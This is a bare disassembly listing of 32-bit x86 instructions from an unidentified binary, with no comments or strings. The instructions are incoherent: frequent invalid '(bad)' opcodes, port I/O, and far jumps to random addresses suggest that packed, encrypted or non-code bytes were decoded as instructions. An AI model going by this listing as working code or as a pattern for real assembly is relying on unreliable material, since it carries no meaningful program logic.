  414e31:	cld    
  414e32:	clc    
  414e33:	imul   edi,DWORD PTR [ebp+edx*1-0x6f],0xbeecf38e
  414e3b:	xor    DWORD PTR [ecx-0x4b],edi
  414e3e:	paddusw mm5,mm0
  414e41:	xor    ah,BYTE PTR [edx]
  414e43:	or     BYTE PTR [esi+edi*8+0x21],dh
  414e47:	out    dx,eax
  414e48:	(bad)  
  414e4a:	lock cmp eax,0xa4c2b8b2
  414e50:	cmc    
  414e51:	jmp    0x414ea8
  414e53:	adc    eax,0xb8d4f0b
  414e58:	xor    eax,0x849a0eda
  414e5d:	xor    ebx,DWORD PTR [esi+0x40]
  414e60:	push   esp
  414e62:	rcl    esi,1
  414e64:	shr    dl,cl
  414e66:	ins    BYTE PTR es:[di],dx
  414e68:	cmc    
  414e69:	call   0xd9c8:0x9bc4a1ae
  414e70:	repz push 0x35
  414e73:	inc    esi
  414e74:	fucomp st(6)
  414e76:	cwde   
  414e77:	or     ah,BYTE PTR [ebx]
  414e79:	add    cl,BYTE PTR [edi+0x35]
  414e7c:	push   0xffffffb4
  414e7e:	sub    BYTE PTR [edx-0x7a],dh
  414e81:	loope  0x414e9f
  414e83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e84:	cmp    bh,BYTE PTR [ebp+0x5]
  414e87:	pop    edx
  414e88:	in     al,dx
  414e89:	inc    ebp
  414e8a:	lods   al,BYTE PTR ds:[esi]
  414e8b:	pop    ebx
  414e8c:	aam    0x81
  414e8e:	and    BYTE PTR [esi+0x63],0xe2
  414e92:	ss (bad) 
  414e94:	nop
  414e95:	lods   al,BYTE PTR ds:[esi]
  414e96:	add    al,0xba
  414e98:	adc    esp,DWORD PTR [ebx+0x491b6741]
  414e9e:	xor    ch,BYTE PTR [edx]
  414ea0:	pop    ebp
  414ea1:	sub    dh,BYTE PTR [edx+0x621ea0bc]
  414ea7:	js     0x414e64
  414ea9:	in     eax,dx
  414eaa:	jl     0x414e9b
  414eac:	mov    ds:0xfac93f9a,al
  414eb1:	sub    BYTE PTR [ebx],ch
  414eb3:	test   DWORD PTR [edi-0x76],ebx
  414eb6:	pop    ds
  414eb7:	ds ror BYTE PTR es:[esi+0x37],0x42
  414ebd:	inc    edx
  414ebe:	pop    ebp
  414ebf:	into   
  414ec0:	xlat   BYTE PTR ds:[ebx]
  414ec1:	fwait
  414ec2:	test   BYTE PTR [ebp+0x288ff0b1],dl
  414ec8:	and    DWORD PTR [ecx],0x4f0bca4c
  414ece:	push   esp
  414ecf:	mov    ah,0xce
  414ed1:	sar    DWORD PTR [edx+0x5b5e9a7d],0xb6
  414ed8:	rol    bl,0x57
  414edb:	xchg   ebx,eax
  414edc:	jbe    0x414eaa
  414ede:	or     dh,dh
  414ee0:	dec    ecx
  414ee1:	test   eax,0xc7e40b67
  414ee6:	mov    ecx,0x5e0a8a01
  414eeb:	push   cs
  414eec:	mov    ds:0x8167bd66,eax
  414ef1:	add    DWORD PTR [ecx-0x2dff3a46],ecx
  414ef7:	(bad)  
  414ef9:	(bad)  
  414efa:	fimul  WORD PTR [edi+0x2bb71f29]
  414f00:	push   edi
  414f01:	ds fdivrp st(5),st
  414f04:	inc    ebx
  414f05:	popa   
  414f06:	pop    esi
  414f07:	cmc    
  414f08:	push   ecx
  414f09:	inc    edi
  414f0a:	aas    
  414f0b:	rol    ebx,0xf8
  414f0e:	mov    cl,0x4f
  414f10:	adc    bl,BYTE PTR [ebp+0x28d60e5d]
  414f16:	inc    esp
  414f17:	pushf  
  414f18:	jp     0xe21b1eb5
  414f1e:	xor    al,0x8f
  414f20:	push   esi
  414f21:	inc    esp
  414f22:	mov    esp,ebx
  414f24:	loopne 0x414ef0
  414f26:	jne    0x414f21
  414f28:	outs   dx,BYTE PTR ds:[esi]
  414f29:	ins    BYTE PTR es:[edi],dx
  414f2a:	jge    0x414eda
  414f2c:	fild   WORD PTR [ecx+edi*8]
  414f2f:	popf   
  414f30:	and    ah,BYTE PTR gs:[eax-0x7f384e76]
  414f37:	pop    esp
  414f38:	inc    ebx
  414f39:	mov    ch,0xbc
  414f3b:	sbb    edi,0x7d6264da
  414f41:	jnp    0x414f3f
  414f43:	mul    esi
  414f45:	adc    ah,BYTE PTR [ebx+0x24f14d8d]
  414f4b:	xor    BYTE PTR [ecx-0x2dcd59a6],0xc4
  414f52:	scas   al,BYTE PTR es:[edi]
  414f53:	and    al,0x11
  414f55:	and    BYTE PTR [ebp-0x66e7e43d],al
  414f5b:	clc    
  414f5c:	iret   
  414f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f5e:	pop    ecx
  414f5f:	leave  
  414f60:	add    esp,ebp
  414f62:	adc    BYTE PTR [ecx],ah
  414f64:	pushf  
  414f65:	mov    edx,0x73dfaa08
  414f6a:	imul   ebx,DWORD PTR [ebx],0xffffffc3
  414f6d:	loopne 0x414f97
  414f6f:	mov    WORD PTR ds:0x31f4d759,ss
  414f75:	retf   0x81a7
  414f78:	xchg   esp,eax
  414f79:	cmp    edx,DWORD PTR [edi-0x2f]
  414f7c:	mov    cl,0xc9
  414f7e:	mov    eax,ds:0x7981549c
  414f83:	std    
  414f84:	cmc    
  414f85:	faddp  st(2),st
  414f87:	push   ds
  414f88:	test   al,0x94
  414f8a:	mov    dl,0x59
  414f8c:	out    0x7b,al
  414f8e:	outs   dx,BYTE PTR ds:[esi]
  414f8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f90:	(bad)  
  414f92:	add    BYTE PTR [ebx+0x512e77e],dl
  414f98:	and    DWORD PTR [ecx],edx
  414f9a:	jmp    0xa054:0xc4f96592
  414fa1:	popf   
  414fa2:	sbb    DWORD PTR [ecx],esp
  414fa4:	outs   dx,BYTE PTR es:[esi]
  414fa6:	fsub   QWORD PTR [ecx-0x5bfb90df]
  414fac:	add    bl,al
  414fae:	shl    BYTE PTR [edx-0x6a],1
  414fb1:	stos   BYTE PTR es:[edi],al
  414fb2:	(bad)  
  414fb3:	cdq    
  414fb4:	dec    esp
  414fb5:	shl    bh,0xb2
  414fb8:	adc    al,0xc3
  414fba:	je     0x414fb7
  414fbc:	jo     0x414f7f
  414fbe:	enter  0x687,0x6f
  414fc2:	xor    al,0xc8
  414fc4:	add    ebp,DWORD PTR [esi+0x7]
  414fc7:	push   edx
  414fc8:	mov    dh,0x98
  414fca:	push   edx
  414fcb:	fimul  DWORD PTR [ebx-0x1c]
  414fce:	mov    edi,0x70293a43
  414fd3:	fist   DWORD PTR [ebp-0x59]
  414fd6:	jno    0x415057
  414fd8:	in     al,0x50
  414fda:	arpl   WORD PTR [ebp-0x12],sp
  414fdd:	push   ds
  414fde:	sbb    esi,ebp
  414fe0:	jge    0x414f93
  414fe2:	mov    ecx,0x5546ee9c
  414fe7:	push   ss
  414fe8:	add    bl,BYTE PTR [ecx+0x416ae54e]
  414fee:	xchg   edx,eax
  414fef:	inc    eax
  414ff0:	ins    BYTE PTR es:[edi],dx
  414ff1:	mov    cl,BYTE PTR [ebp+0x4d]
  414ff4:	fimul  WORD PTR [ecx]
  414ff6:	jg     0x414f93
  414ff8:	mov    ds:0xe82eacb2,eax
  414ffd:	pop    ecx
  414ffe:	dec    esi
  414fff:	arpl   WORD PTR [esi],bx
  415001:	pop    ebx
  415002:	mov    esp,0x60158504
  415007:	es ins DWORD PTR es:[edi],dx
  415009:	pop    ecx
  41500a:	call   0x7735:0x29759937
  415011:	lock fs clc 
  415014:	imul   ebx,DWORD PTR [eax+0x30],0xeee4b965
  41501b:	pop    esi
  41501c:	xor    dl,BYTE PTR [esi]
  41501e:	sbb    DWORD PTR [edx+ebx*4-0x36],edi
  415022:	add    eax,0x74c35241
  415027:	lods   eax,DWORD PTR ds:[esi]
  415028:	mov    ch,0x70
  41502a:	outs   dx,BYTE PTR ds:[esi]
  41502b:	pop    es
  41502c:	sbb    ebx,ebx
  41502e:	mov    DWORD PTR [ecx],edi
  415030:	push   edx
  415031:	mov    WORD PTR [ebp+0x1f],ds
  415034:	xchg   edi,eax
  415035:	add    esi,esp
  415037:	fild   WORD PTR [edi]
  415039:	xchg   BYTE PTR [ebp-0x14f14401],al
  41503f:	jno    0x415016
  415041:	push   ds
  415042:	sbb    ch,0x11
  415045:	sahf   
  415046:	bound  esp,QWORD PTR [ebx]
  415048:	pop    es
  415049:	hlt    
  41504a:	xor    al,0xa4
  41504c:	mov    edx,DWORD PTR [edi-0xdca1305]
  415052:	in     eax,dx
  415053:	sub    ecx,edx
  415055:	cs push ds
  415057:	(bad)  
  415058:	sahf   
  415059:	lods   eax,DWORD PTR ds:[esi]
  41505a:	jp     0x4150a9
  41505c:	cwde   
  41505d:	in     al,dx
  41505e:	lahf   
  41505f:	mov    ch,0x61
  415061:	lods   eax,DWORD PTR ds:[esi]
  415062:	pop    ebx
  415063:	add    esp,0x3dff383b
  415069:	ret    0x1500
  41506c:	adc    dl,al
  41506e:	fcomp  DWORD PTR [edi+0x50]
  415071:	mov    eax,DWORD PTR ds:0x8efe8ffa
  415077:	in     al,0x50
  415079:	push   0x3596b52d
  41507e:	push   0x3e069d3
  415083:	imul   eax,eax,0xffffff90
  415086:	shl    BYTE PTR [ecx+0x204758c6],cl
  41508c:	mov    ds:0xbb48eaff,al
  415091:	push   eax
  415092:	xor    DWORD PTR [ebx+0x3b],ebp
  415095:	aas    
  415096:	jno    0x415081
  415098:	(bad)  
  415099:	fmul   DWORD PTR cs:[ecx+ebp*2-0x45]
  41509e:	inc    ecx
  41509f:	fnstsw WORD PTR [ebp-0x72]
  4150a2:	push   0xfffffff0
  4150a4:	ret    
  4150a5:	mov    bh,0xc5
  4150a7:	outs   dx,BYTE PTR ds:[esi]
  4150a8:	sbb    DWORD PTR [esi-0x14e89004],ecx
  4150ae:	repz addr16 mov esp,0x15b9477d
  4150b5:	or     al,0x23
  4150b7:	in     eax,0xbc
  4150b9:	cmp    ch,ah
  4150bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150bc:	mov    edx,0x7c47cf02
  4150c1:	cmp    bh,dl
  4150c3:	movmskps eax,xmm1
  4150c6:	rol    cl,1
  4150c8:	popa   
  4150c9:	jecxz  0x4150a7
  4150cb:	(bad)  
  4150cd:	jbe    0x415131
  4150cf:	scas   al,BYTE PTR es:[edi]
  4150d0:	inc    esi
  4150d1:	push   cs
  4150d2:	jbe    0x415140
  4150d4:	aaa    
  4150d5:	xor    al,0x2a
  4150d7:	dec    ebp
  4150d8:	jp     0x41508c
  4150da:	repnz dec esp
  4150dc:	mov    dh,0x15
  4150de:	outs   dx,BYTE PTR fs:[esi]
  4150e0:	pop    es
  4150e1:	cmp    bl,0xe3
  4150e4:	sub    al,0x77
  4150e6:	xchg   esp,eax
  4150e7:	aaa    
  4150e8:	adc    edx,DWORD PTR [ebx]
  4150ea:	push   eax
  4150eb:	adc    DWORD PTR [ebp+0x41],esp
  4150ee:	mov    cs,WORD PTR [ebx]
  4150f0:	in     al,0xd8
  4150f2:	lock mov cl,0xe4
  4150f5:	push   esi
  4150f6:	scas   eax,DWORD PTR es:[edi]
  4150f7:	sbb    eax,0x5d4cf68
  4150fc:	arpl   WORD PTR ds:[edi],bp
  4150ff:	xchg   ebx,eax
  415100:	pop    ebp
  415101:	cmp    eax,0x8c1cbc63
  415106:	sub    eax,0x5f95b9ed
  41510b:	adc    bl,BYTE PTR [edx+0x7f3c123c]
  415111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415112:	inc    BYTE PTR [edx]
  415114:	or     bl,BYTE PTR [ebp-0x6fb4091d]
  41511a:	les    ecx,FWORD PTR [eax-0x32dcf9a]
  415120:	dec    edx
  415121:	add    edx,DWORD PTR [edx-0x58]
  415124:	cmp    eax,0x87eb2896
  415129:	mov    cl,0xc0
  41512b:	fiadd  DWORD PTR [esi-0xf]
  41512e:	es aaa 
  415130:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415131:	repnz mov cs,WORD PTR [ecx]
  415134:	sbb    al,0xb1
  415136:	mov    eax,DWORD PTR [ebp-0x12]
  415139:	push   ebp
  41513a:	jmp    0x415102
  41513c:	fmul   QWORD PTR [edx-0x784d8a8e]
  415142:	cmp    al,0x20
  415144:	xchg   esi,eax
  415145:	out    0xc7,eax
  415147:	inc    edi
  415148:	or     al,0x16
  41514a:	cdq    
  41514b:	xor    cl,BYTE PTR [eax+ecx*1+0x4b]
  41514f:	stos   DWORD PTR es:[edi],eax
  415150:	rcr    BYTE PTR [edx+esi*2-0x55],1
  415154:	leave  
  415155:	mov    al,ds:0xa1406056
  41515a:	out    dx,eax
  41515b:	xchg   ecx,eax
  41515c:	cmp    edx,ebp
  41515e:	xchg   ebp,eax
  41515f:	repnz xlat BYTE PTR ds:[ebx]
  415161:	pop    esp
  415162:	stos   DWORD PTR es:[edi],eax
  415163:	or     BYTE PTR [edi],bl
  415165:	and    bl,BYTE PTR [edx-0x7e]
  415168:	xchg   ecx,eax
  415169:	and    bh,BYTE PTR [eax+0x7090fa9e]
  41516f:	inc    BYTE PTR [eax+esi*2+0x25dc845e]
  415176:	test   BYTE PTR [ebp+0x28f4f9f2],ah
  41517c:	mov    WORD PTR [edx],cs
  41517e:	inc    ebx
  41517f:	add    eax,0x7c254f27
  415184:	cmp    DWORD PTR [edi],ecx
  415186:	dec    ebx
  415187:	dec    ebp
  415188:	test   eax,0xb42a8b83
  41518d:	hlt    
  41518e:	idiv   BYTE PTR [ebp-0x75]
  415191:	add    edx,DWORD PTR [edi]
  415193:	jmp    0x26e44b72
  415198:	dec    edi
  415199:	rcr    bh,cl
  41519b:	mov    ebp,ecx
  41519d:	adc    cl,BYTE PTR [eax-0x2d]
  4151a0:	push   cs
  4151a1:	and    eax,0x70eb006e
  4151a6:	sbb    eax,0x3650ed3a
  4151ab:	das    
  4151ac:	fdivr  DWORD PTR [ecx+esi*2+0x33]
  4151b0:	loopne 0x415211
  4151b2:	jnp    0x4151e6
  4151b4:	lock add DWORD PTR [edi+edi*1],eax
  4151b8:	and    al,0x63
  4151ba:	shr    BYTE PTR [bp+si+0x3],1
  4151be:	pop    ecx
  4151bf:	add    dh,dl
  4151c1:	jecxz  0x41520f
  4151c3:	and    eax,0x5899deb8
  4151c8:	dec    ecx
  4151c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151ca:	push   0x7f
  4151cc:	xchg   esp,eax
  4151cd:	hlt    
  4151ce:	ror    BYTE PTR fs:[edi],1
  4151d1:	loopne 0x4151fe
  4151d3:	data16 aam 0x39
  4151d6:	mov    edx,DWORD PTR [ecx+eiz*8+0x422625b8]
  4151dd:	push   ss
  4151de:	sbb    BYTE PTR [ecx+0x54],0xf6
  4151e2:	dec    edx
  4151e3:	or     BYTE PTR [eax-0x7d],bl
  4151e6:	adc    al,0xe5
  4151e8:	pop    edi
  4151e9:	jp     0x4151a2
  4151eb:	jns    0x4151fc
  4151ed:	ds pop ebp
  4151ef:	jo     0x4151ec
  4151f1:	cmp    eax,0xd62c4982
  4151f6:	and    bl,al
  4151f8:	ja     0x41519a
  4151fa:	xchg   edx,eax
  4151fb:	adc    cl,BYTE PTR [esi+0x1d94da38]
  415201:	jg     0x41524b
  415203:	push   esi
  415204:	inc    eax
  415205:	xlat   BYTE PTR ds:[ebx]
  415206:	mov    eax,0xb06c4dce
  41520b:	adc    esp,DWORD PTR [eax+0x29]
  41520e:	repz out dx,eax
  415210:	mov    dh,0x4
  415212:	and    bh,BYTE PTR [edx-0x5234ede9]
  415218:	jno    0x41520a
  41521a:	mov    edx,0x16094393
  41521f:	(bad)  
  415220:	mov    cl,0x84
  415222:	in     eax,0x34
  415224:	cmp    DWORD PTR [edi+0x56106bea],ecx
  41522a:	jmp    0x87c26621
  41522f:	xlat   BYTE PTR ds:[ebx]
  415230:	jnp    0x4151be
  415232:	fs mov bh,0xbf
  415235:	sub    eax,0x4b70cb18
  41523a:	stos   BYTE PTR es:[edi],al
  41523b:	add    bl,dl
  41523d:	mov    dh,0x1
  41523f:	adc    eax,0x10d016c7
  415244:	cli    
  415245:	shl    DWORD PTR [ebx],cl
  415247:	dec    edi
  415248:	clc    
  415249:	mov    al,ds:0xd31e7576
  41524e:	imul   ebx,ebp,0x36
  415251:	or     BYTE PTR [esi],0xf
  415254:	jg     0x4152ae
  415256:	add    eax,0xbc375583
  41525b:	jno    0x415207
  41525d:	or     al,0x81
  41525f:	mov    WORD PTR [ecx-0x31183501],?
  415265:	out    0x6,eax
  415267:	int3   
  415268:	lods   eax,DWORD PTR ds:[esi]
  415269:	shl    DWORD PTR [edx-0x2b],cl
  41526c:	stos   BYTE PTR es:[edi],al
  41526d:	jb     0x4151fb
  41526f:	mov    ch,0x81
  415271:	dec    edx
  415272:	xor    esp,DWORD PTR [eax]
  415274:	push   edx
  415275:	add    esp,edi
  415277:	xchg   esp,eax
  415278:	scas   eax,DWORD PTR es:[edi]
  415279:	call   0xc53b3f02
  41527e:	pop    ebp
  41527f:	loop   0x41529f
  415281:	jne    0x4152e2
  415283:	dec    esi
  415284:	jle    0x415229
  415286:	das    
  415287:	jne    0x4152a2
  415289:	stc    
  41528a:	xor    DWORD PTR [ebx-0x76e35be8],ebx
  415290:	popf   
  415291:	aas    
  415292:	iret   
  415293:	mov    esi,0x316b39fc
  415298:	pop    esi
  415299:	pop    es
  41529a:	jae    0x4152c7
  41529c:	(bad)  
  41529d:	sub    eax,0xd0608e39
  4152a2:	dec    ebp
  4152a3:	popf   
  4152a4:	test   BYTE PTR [eax-0x4d],dl
  4152a7:	sbb    DWORD PTR [edx],0xffffffd5
  4152aa:	xchg   dl,al
  4152ac:	push   ds
  4152ad:	(bad)  
  4152ae:	push   0xc3d45227
  4152b3:	mov    ss,WORD PTR [esi+0x5556644e]
  4152b9:	jne    0x415264
  4152bb:	retf   
  4152bc:	xor    al,0xdd
  4152be:	xor    DWORD PTR [ecx+0x50],0x3a00c19d
  4152c5:	jns    0x4152bf
  4152c7:	ss dec ecx
  4152c9:	and    BYTE PTR [edi-0x61fc6f78],ah
  4152cf:	xlat   BYTE PTR ds:[ebx]
  4152d0:	jge    0x41530a
  4152d2:	loopne 0x415321
  4152d4:	mov    eax,ds:0x93d038ba
  4152d9:	xchg   BYTE PTR ds:0xe9e9a77c,ch
  4152df:	jae    0x415317
  4152e1:	cld    
  4152e2:	sub    edi,DWORD PTR [ebx+ecx*2-0xf68132f]
  4152e9:	mov    ds:0xe6dac5e9,eax
  4152ee:	adc    al,0xc2
  4152f0:	int3   
  4152f1:	inc    esi
  4152f2:	sub    DWORD PTR [edx],edi
  4152f4:	sub    esp,DWORD PTR [ebx+0xc024627]
  4152fa:	push   0x75
  4152fc:	xor    ebp,DWORD PTR [eax-0x58dc7122]
  415302:	sbb    BYTE PTR [eax],dh
  415304:	inc    ebp
  415305:	icebp  
  415306:	outs   dx,BYTE PTR ds:[esi]
  415307:	icebp  
  415308:	jnp    0x4152c0
  41530a:	pop    ss
  41530b:	rol    BYTE PTR [ecx+eax*8-0x2a33e18a],0xce
  415313:	pop    esi
  415314:	(bad)
  415318:	data16 add bh,BYTE PTR [esi-0x47]
  41531c:	adc    esi,DWORD PTR [ecx]
  41531e:	dec    ecx
  41531f:	idiv   DWORD PTR ds:0xbe8491a9
  415325:	xlat   BYTE PTR ds:[ebx]
  415326:	inc    ebx
  415327:	mov    al,0x78
  415329:	xchg   ecx,eax
  41532a:	pop    ss
  41532b:	sahf   
  41532c:	adc    eax,DWORD PTR [edi+0x7d]
  41532f:	scas   eax,DWORD PTR es:[edi]
  415330:	mov    ebp,0xdb327016
  415335:	retf   0x9f99
  415338:	mov    WORD PTR [edx],ss
  41533a:	jmp    0x9f57f65f
  41533f:	fstp   QWORD PTR [edx+0x67]
  415342:	xor    dh,ch
  415344:	adc    BYTE PTR [eax+0x4e83ee79],dh
  41534a:	or     BYTE PTR [esi+0x69],0x63
  41534e:	mov    al,ds:0x695483a5
  415353:	adc    BYTE PTR [eax+edi*4-0x712a9001],dl
  41535a:	or     DWORD PTR [eax],edx
  41535c:	jnp    0x415393
  41535e:	fdivr  DWORD PTR [eax+ebx*1-0x33]
  415362:	and    DWORD PTR [ecx-0x465a2d40],ecx
  415368:	scas   al,BYTE PTR es:[edi]
  415369:	push   0xffffffb4
  41536b:	adc    BYTE PTR [esi+eiz*2+0x7b],cl
  41536f:	inc    ebp
  415370:	mov    esi,0x2044ba90
  415375:	cwde   
  415376:	fist   WORD PTR [ecx-0x6f3dae7d]
  41537c:	pop    esi
  41537d:	lds    edx,FWORD PTR [eax-0x6310d978]
  415383:	mov    ds:0x67681e4f,al
  415388:	daa    
  415389:	mov    ah,0xd1
  41538b:	push   edx
  41538c:	hlt    
  41538d:	push   ecx
  41538e:	(bad)  
  41538f:	jae    0x4153f0
  415391:	or     ebx,DWORD PTR [ecx+0x589eddc9]
  415397:	rcl    BYTE PTR [edx*8+0x451e669f],1
  41539e:	push   0x58
  4153a0:	inc    DWORD PTR [ebx-0x59]
  4153a3:	cmp    dh,bh
  4153a5:	fs (bad) 
  4153a7:	idiv   BYTE PTR [edi-0x36]
  4153aa:	sbb    al,0xe6
  4153ac:	int    0x8
  4153ae:	pusha  
  4153af:	xchg   BYTE PTR [eax+0x3533c27],dh
  4153b5:	fs pop edi
  4153b7:	xlat   BYTE PTR ds:[ebx]
  4153b8:	popf   
  4153b9:	push   0x47
  4153bb:	or     BYTE PTR [edi+ebp*1],cl
  4153be:	rcr    DWORD PTR ds:0xc69876cd,cl
  4153c4:	cwde   
  4153c5:	xor    dl,BYTE PTR [edi-0x5f]
  4153c8:	xchg   esi,eax
  4153c9:	loopne 0x4153fc
  4153cb:	cmp    eax,0x8413335f
  4153d0:	xor    dl,BYTE PTR [bx+di+0x3d]
  4153d4:	mov    ah,dl
  4153d6:	fisttp QWORD PTR [ebx-0x2a]
  4153d9:	sbb    eax,0x323e1c1
  4153de:	jp     0x41540e
  4153e0:	popa   
  4153e1:	fistp  WORD PTR [ebx+ebx*8+0x33b2ebf8]
  4153e8:	lods   eax,DWORD PTR ds:[esi]
  4153e9:	add    ebx,edi
  4153eb:	dec    ebx
  4153ec:	fild   DWORD PTR [ecx+0x34b6781d]
  4153f2:	sahf   
  4153f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153f4:	xchg   ebp,eax
  4153f5:	mov    cl,BYTE PTR ds:0xb70143ba
  4153fb:	adc    esi,eax
  4153fd:	fcmovnu st,st(4)
  4153ff:	mov    ds:0x559c6faf,al
  415404:	sub    dh,BYTE PTR [ebx-0x5e]
  415407:	add    al,0x37
  415409:	mov    ebp,0x3fbcabf5
  41540e:	pushf  
  41540f:	dec    edi
  415410:	(bad)  
  415411:	lea    ecx,[eax]
  415413:	scas   al,BYTE PTR es:[edi]
  415414:	fsub   st(1),st
  415416:	cmp    DWORD PTR [esi-0x60e85d82],esp
  41541c:	mov    ebx,0x4418bbbd
  415421:	mov    al,ds:0x4b526e71
  415426:	ret    
  415427:	mov    ds:0xba4fe1ce,al
  41542c:	sbb    al,0x59
  41542e:	test   al,0x52
  415430:	cmp    DWORD PTR [esi+0x259624d4],ecx
  415436:	into   
  415437:	les    ecx,FWORD PTR [ebx+ecx*1-0x10]
  41543b:	dec    eax
  41543c:	and    dh,BYTE PTR [edi+eiz*2-0x6]
  415440:	shl    BYTE PTR [ecx-0x52],cl
  415443:	or     al,0x99
  415445:	add    dh,BYTE PTR [edx+0x6e899d07]
  41544b:	fistp  QWORD PTR [ebx+esi*4-0xf88485b]
  415452:	mov    al,0x89
  415454:	mov    bh,0x20
  415456:	aaa    
  415457:	fcmovne st,st(6)
  415459:	add    DWORD PTR ds:0xdf60322d,edi
  41545f:	pop    fs
  415461:	mov    edi,0xf04b380
  415466:	gs out 0x9d,al
  415469:	lds    ecx,FWORD PTR [ecx]
  41546b:	es pop edx
  41546d:	test   eax,0xf8bca6e6
  415472:	sub    eax,DWORD PTR [ebx+0x70]
  415475:	cmp    eax,0xc8c61cb9
  41547a:	jg     0x41541e
  41547c:	pop    ss
  41547d:	in     eax,0xbf
  41547f:	sub    eax,0xab1397da
  415484:	je     0x415444
  415486:	dec    eax
  415487:	mov    ch,al
  415489:	ror    eax,cl
  41548b:	(bad)  
  41548c:	mov    bh,BYTE PTR [ecx]
  41548e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41548f:	scas   eax,DWORD PTR es:[edi]
  415490:	popa   
  415491:	(bad)  
  415492:	adc    bl,BYTE PTR [ebx+0x7e]
  415495:	(bad)  
  415496:	jo     0x41547f
  415498:	cmp    ebx,DWORD PTR [eax+eiz*4]
  41549b:	fs inc edx
  41549d:	dec    ebp
  41549e:	not    dh
  4154a0:	push   ecx
  4154a1:	rcl    dl,cl
  4154a3:	loope  0x4154c3
  4154a5:	mov    edx,0x73f9f958
  4154aa:	imul   edx,DWORD PTR [ecx+0x64],0x1032f4a1
  4154b1:	add    BYTE PTR [ebx+0x4901720a],al
  4154b7:	cmc    
  4154b8:	adc    al,BYTE PTR [esi+0x55]
  4154bb:	iret   
  4154bc:	stos   BYTE PTR es:[edi],al
  4154bd:	jbe    0x415509
  4154bf:	cmp    BYTE PTR [eax+0x1737f3ca],ch
  4154c5:	mov    ds:0x2db8a4ff,eax
  4154ca:	add    al,0x74
  4154cc:	je     0x4154c5
  4154ce:	sbb    BYTE PTR [esi+0x2731fcdd],bl
  4154d4:	inc    edx
  4154d5:	mov    bh,BYTE PTR [eax]
  4154d7:	sahf   
  4154d8:	imul   esp,DWORD PTR [ecx],0x61
  4154db:	in     al,dx
  4154dc:	(bad)  
  4154de:	add    DWORD PTR [ebx],0x4d503274
  4154e4:	les    eax,FWORD PTR [ebx-0x4]
  4154e7:	lods   al,BYTE PTR ds:[esi]
  4154e8:	iret   
  4154e9:	mov    ch,0x25
  4154eb:	push   cs
  4154ec:	adc    BYTE PTR [esi-0x2f0dd947],ah
  4154f2:	jecxz  0x4154fd
  4154f4:	std    
  4154f5:	hlt    
  4154f6:	jne    0x415534
  4154f8:	sub    al,0xb4
  4154fa:	in     al,dx
  4154fb:	out    0xf1,al
  4154fd:	outs   dx,BYTE PTR ds:[esi]
  4154fe:	and    al,0xfc
  415500:	pop    es
  415501:	test   ch,dh
  415503:	(bad)  
  415504:	das    
  415505:	mov    ecx,0x3ad93d33
  41550a:	xor    bh,BYTE PTR [edx+eiz*1]
  41550d:	fs jl  0x415532
  415510:	lock lahf 
  415512:	cdq    
  415513:	rcl    BYTE PTR [edx-0x2fa01547],cl
  415519:	cdq    
  41551a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41551b:	addr16 dec ebp
  41551d:	(bad)  
  41551e:	imul   ecx,ecx,0x48
  415521:	mov    ah,bl
  415523:	repnz push 0xffffffa6
  415526:	out    0x58,al
  415528:	call   0xe12da47a
  41552d:	repz gs pop ecx
  415530:	mov    eax,ds:0xb4eb344e
  415535:	retf   
  415536:	fidiv  DWORD PTR [ecx-0x76]
  415539:	scas   al,BYTE PTR es:[edi]
  41553a:	fsubp  st(4),st
  41553c:	loope  0x4154fd
  41553e:	adc    al,0x4b
  415540:	pop    ebp
  415541:	pop    ecx
  415542:	mov    ch,0xe7
  415544:	jno    0x41552d
  415546:	jmp    0x5559:0x57b348d6
  41554d:	mov    ebp,0x64e4a59d
  415552:	stos   BYTE PTR es:[edi],al
  415553:	lods   al,BYTE PTR ds:[esi]
  415554:	or     bh,al
  415556:	push   ebx
  415557:	inc    ecx
  415558:	ss out 0x25,eax
  41555b:	fs pop ss
  41555d:	lods   al,BYTE PTR ds:[esi]
  41555e:	shr    BYTE PTR [esi+0x6a],cl
  415561:	push   esi
  415562:	fsub   st(2),st
  415564:	sbb    DWORD PTR [ecx-0x5dbf17a7],eax
  41556a:	fcomp  st(2)
  41556c:	sti    
  41556d:	sub    al,0x2f
  41556f:	imul   eax,DWORD PTR [ebx-0x50e3a4c3],0x57
  415576:	xor    eax,0x7ae3a3f1
  41557b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41557c:	mov    ecx,0x8695392c
  415581:	es int 0x67
  415584:	fistp  QWORD PTR [eax+0x21]
  415587:	sub    eax,0x9d3b20c5
  41558c:	ins    DWORD PTR es:[edi],dx
  41558d:	xchg   ebp,eax
  41558e:	inc    edi
  41558f:	ins    BYTE PTR es:[edi],dx
  415590:	mov    edx,ebx
  415592:	sbb    ch,BYTE PTR [eax+ecx*1-0x56]
  415596:	dec    ebp
  415597:	or     BYTE PTR [esi-0x63],cl
  41559a:	push   cs
  41559b:	in     al,0x31
  41559d:	mov    eax,ds:0x3706fa62
  4155a2:	xlat   BYTE PTR ds:[ebx]
  4155a3:	mov    dl,0x3b
  4155a5:	rcr    DWORD PTR [eax],cl
  4155a7:	sub    dl,dh
  4155a9:	dec    esi
  4155aa:	add    al,0x9c
  4155ac:	cmc    
  4155ad:	je     0x4155cb
  4155af:	ficom  WORD PTR [ebx]
  4155b1:	mov    ds:0xa47ebea8,al
  4155b6:	cs cmp edi,ebp
  4155b9:	sbb    BYTE PTR [ecx+0x2],bh
  4155bc:	int3   
  4155bd:	add    ah,0x68
  4155c0:	ja     0x415570
  4155c2:	sbb    bh,BYTE PTR [edx+0x19f723d9]
  4155c8:	jp     0x4155e8
  4155ca:	out    0xc0,al
  4155cc:	xchg   esp,eax
  4155cd:	retf   0x82e0
  4155d0:	inc    esp
  4155d1:	mov    ds:0xdd6390a1,al
  4155d6:	inc    edx
  4155d7:	int    0xa0
  4155d9:	hlt    
  4155da:	pop    esi
  4155db:	leave  
  4155dc:	sub    esi,eax
  4155de:	jecxz  0x4155d6
  4155e0:	stc    
  4155e1:	fnstsw WORD PTR [esi-0x36]
